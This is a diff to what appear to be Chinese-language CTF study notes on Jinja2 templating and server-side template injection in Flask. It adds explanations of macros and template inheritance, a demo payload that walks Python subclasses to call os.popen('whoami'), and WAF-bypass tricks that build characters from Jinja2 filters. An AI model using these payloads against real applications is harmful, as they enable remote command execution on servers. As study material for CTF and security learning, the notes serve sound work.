@@ -88,7 +88,10 @@
         * [宏](#宏)
         * [模板继承](#模板继承)
       * [Python中的一些 Magic Method](#python中的一些-magic-method)
+    * [常用注入模块](#常用注入模块)
+    * [\{% %\}使用](#-使用)
   * [waf绕过](#waf绕过)
+    * [绕过数字、字符](#绕过数字字符)
 * [Python Flask框架相关](#python-flask框架相关)
 * [Python中@的用法](#python中的用法)
 * [Python super函数的理解](#python-super函数的理解)
@@ -3266,8 +3269,8 @@ jinja2中还有宏，宏允许你定义一组代码，并在模板中多次调�
     Hello, {{ name }}!
 {% endmacro %}
 
-{% call greet("A") %}
-{% call greet("B") %}
+{{ greet("A") }}
+{{ greet("B") }}
 ```
 
 还能够设置默认参数
@@ -3277,9 +3280,32 @@ jinja2中还有宏，宏允许你定义一组代码，并在模板中多次调�
     {{ greeting }}, {{ name }}!
 {% endmacro %}
 
-{% call greet("A") %}
-{% call greet("B", greeting="Hi") %}
+{{ greet("A") }}
+{{ greet("B", greeting="Hi") }}
 ```
+
+宏还能够支持导入
+
+```jinja2
+{% import 'form.html' as form %}}
+{{ form.greet("B", greeting="Hi") }}
+```
+
+还有一种调用方法，`call`，`macro` 有一个隐含参数 `caller`，其作用是返回 `call` 块中间的内容
+
+```jinja2
+{% macro foo(name) -%}
+    <div>{{ name ~ " says: " ~ caller() }}</div>
+{%- endmacro %}
+
+{% call foo("wi1shu") %}
+    你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好
+{% endcall %}
+```
+
+>值得注意的是，如果不想传递 `caller` 中的内容，也需要在 `macro` 中调用 `caller()`，否则会报错：
+>
+>TypeError: macro ‘foo’ was invoked with two values for the special caller argument. This is most likely a bug.
 
 ###### 模板继承
 
@@ -3292,7 +3318,7 @@ base.html
 ```html
 <head>
     {% block head %}
-    <title>{% block title %}{% endblock %} - Home</title>
+    <title>{% block title %}{% endblock %} - World</title>
     {% endblock %}
 </head>
 
@@ -3323,7 +3349,16 @@ sub.html继承base.html的模板：
 <!-- 其他不修改的原封不动的继承 -->
 ```
 
+渲染：
 
+```python
+from jinja2 import FileSystemLoader, Environment
+
+env = Environment(loader=FileSystemLoader("./"))
+print(env.get_template("sub.html").render())
+```
+
+这里用到了 `FileSystemLoader`，其实用它的逻辑很简单。我们在 bbb.html 中写了 `{% extends "base.html" %}`，那 jinja2 怎么知道 base.html 在哪呢？`FileSystemLoader` 就是用来指定模板文件位置的。同样用途的还有 `PackageLoader`，它是用来指定搜索哪个 Python 包下的模板文件
 
 ##### Python中的一些 Magic Method
 
@@ -3347,6 +3382,8 @@ __import__：动态加载类和函数，也就是导入模块，经常用于导�
 __getattribute__：在访问对象的属性时进行自定义处理。无论对象中的属性是否存在，只要访问对象的属性，就会无条件进入
 __getattr__：访问对象中不存在的属性时进行处理。当对象中没有被访问的属性时，Python解释器会自动调用该方法
 ```
+
+#### 常用注入模块
 
 爆破需要的模块的EXP：
 
@@ -3419,8 +3456,6 @@ if __name__ == "__main__":
 
 ![image-20230729181809015](daydayup.assets/image-20230729181809015.png)
 
-
-
 ```
 <class 'os._wrap_close'>类：
 利用popen()执行命令：().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('whoami').read()
@@ -3475,7 +3510,136 @@ os模块执行命令:
 >
 >这里的`load_module`是一个静态方法，所以能够直接通过类调用而不用实例化对象
 
+#### {% %}使用
+
+{% %}是属于flask的控制语句，且以{% end.. %}结尾，可以通过在控制语句，定义变量或者写循环，判断。
+
+index.html
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>{{ title }}</title>
+</head>
+<body>
+    <h1>{{ heading }}</h1>
+    <ul>
+        {% for item in items %}
+			{% if item == "wi1shu" %}
+				<li>This is {{ item }}</li>
+			{% else %}
+				<li>{{ item }}</li>
+			{% endif %}
+        {% endfor %}
+    </ul>
+</body>
+</html>
+```
+
+app.py
+
+```python
+from flask import Flask, render_template
+from jinja2 import Template
+
+app = Flask(__name__)
+
+
+@app.route('/')
+def main():
+    return render_template('index.html', title='My Page', heading='Welcome to My Page', items=['Apple', 'Banana', 'Orange'])
+
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=50000)
+```
+
+设置变量
+
+```jinja2
+{% set a = 'Apple' %}
+{{ a }}
+```
+
+利用方式
+
+由于模板语法对 Python 语句是有一定程度支持的，所以可以这样利用：
+
+```python
+@app.route('/demo1/')
+def demo1():
+    payload = Template('''
+        {% for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close" %}
+            {% set wi1 = i.__init__.__globals__['popen']('whoami').read() %} 
+            {{wi1}}
+        {% endfor %}
+    ''').render()
+    return payload
+```
+
+但并不是完全支持 Python 所有的语法，所以很多语法是无法使用的，比如列表推导式
+
+```python
+try:
+    print(Template('''
+        {{ [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami') }}
+        ''').render())
+except Exception:
+    print(traceback.format_exc())
+```
+
+会报错：`jinja2.exceptions.TemplateSyntaxError: expected token ',', got 'for'`
+
 ### waf绕过
+
+#### 绕过数字、字符
+
+沙箱逃逸中的`[ ]` 扣字符拼接、`chr` 等。
+
+1. 数字 0：`{{ {}|int }}`、`{{ {}|length }}`
+2. 数字 1：`{{ ({}|int)**({}|int) }}`
+3. 理论上有了 1 之后就可以搞出所有其他数字，可以用 `+` 或者是 `-`+`|abs`
+4. 空格：`{{ {}|center|last }}`、`{1:1}|xmlattr|first`
+5. `<`：`{}|select|string|first`
+6. `>`：`{}|select|string|last`
+7. 点：`{{ self|float|string|min }}` 或者 `c.__lt__|string|truncate(3)|first`
+8. `a-z`：`{{ range.__doc__ + dict.__doc__}}`
+9. `A-Z`：`{{ (range.__doc__ + dict.__doc__) | upper }}`
+
+上面这种都比较常规，思路还是扣字符的思路，顶多是过滤器做了变化。
+
+这里多说一下利用格式化字符串实现的任意字符构造（例如字符 `d`）：
+
+1. 首先搞出 `%c`：`{{ {}|string|urlencode|first~(self|string)[16] }}`
+2. 然后搞出 `d`：`{{ ({}|string|urlencode|first~(self|string)[16]) % 100 }}`
+
+还不需要引号。
+
+>`__lt__` 是Python中用于比较“小于”操作的特殊方法名。
+>
+>`<bound method Undefined._fail_with_undefined_error of Undefined>`：这个错误信息是由Jinja2模板引擎的Undefined对象引起的。当在模板中引用了一个未定义的变量或对象时，Jinja2会将其表示为Undefined对象，以便在模板渲染过程中进行处理。
+>
+>`truncate()` 过滤器用于截断字符串并添加省略号。它可以将一个较长的字符串截断为指定的长度，并在截断处添加省略号以表示字符串被截断了。
+>
+>`{{"Hello, World!"|truncate(6)}}` -> `Hel...`
+
+>`xmlattr()` 是Jinja2中的一个过滤器，用于将字典中的键值对转换为XML属性字符串。
+>
+>```python
+>person = {
+>    'name': 'Alice',
+>    'age': 30
+>}
+>```
+>
+>`<person {{ person|xmlattr }}>...</person>` 渲染后-> `<person name="Alice" age="30">...</person>`
+
+>`self`：在Jinja2模板中，`self` 表示当前上下文中的对象。`self` 只在自定义过滤器和函数中可用，而在模板中不可用。在模板中，可以直接引用传递给模板的变量和上下文中的属性。
+
+>`~` 是字符串拼接运算符。它用于连接两个字符串并生成一个新的字符串。
+>
+>![image-20230803023115250](daydayup.assets/image-20230803023115250.png)
 
 
 
